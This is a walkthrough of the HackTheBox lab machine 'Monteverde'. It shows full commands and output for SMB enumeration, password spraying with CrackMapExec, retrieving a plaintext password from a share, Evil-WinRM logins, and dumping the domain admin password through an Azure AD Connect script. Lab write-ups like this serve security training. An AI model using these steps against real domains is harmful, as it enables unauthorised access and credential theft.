---
description: 09-08-22
---

# Monteverde (Medium)

### Improved skills

* Patience during enumeration, even when there is a high number of open ports on the machine
* Creating wordlists for possible users and passwords
* Always use Enum4Linux
* smbmap before smbclient

### Used tools

* Nmap - NmapAutomator.sh
* smbmap/smbclient
* Enum4Linux
* Evil-WinRM
* Azure-ADConnect.ps1
* CrackMapExec



## Information Gathering

All TCP Ports

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-09 03:12:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf     .NET Message Framing
49667/tcp open  msrpc      Microsoft Windows RPC
49677/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc      Microsoft Windows RPC
49680/tcp open  msrpc      Microsoft Windows RPC
49700/tcp open  msrpc      Microsoft Windows RPC
49751/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

All UDP Ports

```
PORT    STATE SERVICE VERSION
123/udp open  ntp     NTP v3
389/udp open  ldap    Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Notes:

53/DNS- MEGABANK.LOCAL (<mark style="color:yellow;">We get a domain</mark>) -- Place into /etc/hosts

88/Kerberos- Can we perform AS-REP Roasting or Kerberoasting somewhere?

135/RPC- Enumerated, I could not find anything with this initially.

389/LDAP- Ldapdomaindump attempted anonymously with no success.&#x20;

## Enumeration

### enum4linux

```
[+] Server 10.129.128.21 allows sessions using username '', password ''

Domain: MEGA.BANK, MEGABANK.LOCAL

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

* Place these users in a users.txt file
* Place the users in a passwords.txt file in case of password reuse

### CrackMapExec

```
crackmapexec smb 10.129.128.21 -u users -p passwords

SMB         10.129.128.21   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.129.128.21   445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

* We see that a user's password is the same as their username.
* ```
  SABatchJobs:SABatchJobs
  ```
* Since we verified SMB authentication, we can now use smbmap to map out shares to see what we have access to and then use smbclient to connect to that share.&#x20;

### smbmap & smbclient

```
smbmap -H 10.129.128.21 -u 'SABatchJobs' -p 'SABatchJobs'

[+] IP: 10.129.128.21:445       Name: MEGABANK.LOCAL                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        users$                                                  READ ONLY

```

* Let's check out users$ with smbclient

```
smbclient -U 'SABatchJobs' '//10.129.128.21/users$'
Password for [WORKGROUP\SABatchJobs]: SABatchJobs

smb: \> ls
  .                                   D        0  Fri Jan  3 08:12:48 2020
  ..                                  D        0  Fri Jan  3 08:12:48 2020
  dgalanos                            D        0  Fri Jan  3 08:12:30 2020
  mhope                               D        0  Fri Jan  3 08:41:18 2020
  roleary                             D        0  Fri Jan  3 08:10:30 2020
  smorgan                             D        0  Fri Jan  3 08:10:24 2020
  
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 08:41:18 2020
  ..                                  D        0  Fri Jan  3 08:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020
  
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (3.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
smb: \mhope\> exit
```

* We see azure.xml, let's see if there is anything interesting inside

### azure.xml

```
cat azure.xml                                                                                                                              Fri 09 Sep 2022 01:17:46 AM EDT
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>⏎                                            
```

* We see a password for 4n0therD4y@n0th3r$

## Exploitation

### Evil-WinRM

Throughout thorough enumeration of the SMB drives, I was able to extract sensitive information that lead to comprise of the mhope account.

```
evil-winrm -i 10.129.128.21 -u mhope -p '4n0therD4y@n0th3r$'
```

## Privilege Escalation

### Local enumeration

whoami

```
whoami /all

MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
```

### PrivEsc vector - ADSync

* We see that mhope is part of the Azure Admins Group which means that we can perform ADSync.
* The easiest way to pull this off was through this script right here:

{% embed url="https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Azure-ADConnect.ps1" %}

#### Syntax

```
upload Azure-ADConnect.ps1

import-module ./Azure-ADConnect.ps1

Azure-ADConnect -server localhost -db ADSync
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!
```

* As you can see, the script worked and we successfully utilized our DCSync rights to forward us the administrator's password!
* Now all that is left to do is evil-winrm into the administrator's account and own the box!

Evil-WinRM

```
evil-winrm -i 10.129.128.21 -u administrator -p 'd0m@in4dminyeah!'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
megabank\administrator
```

















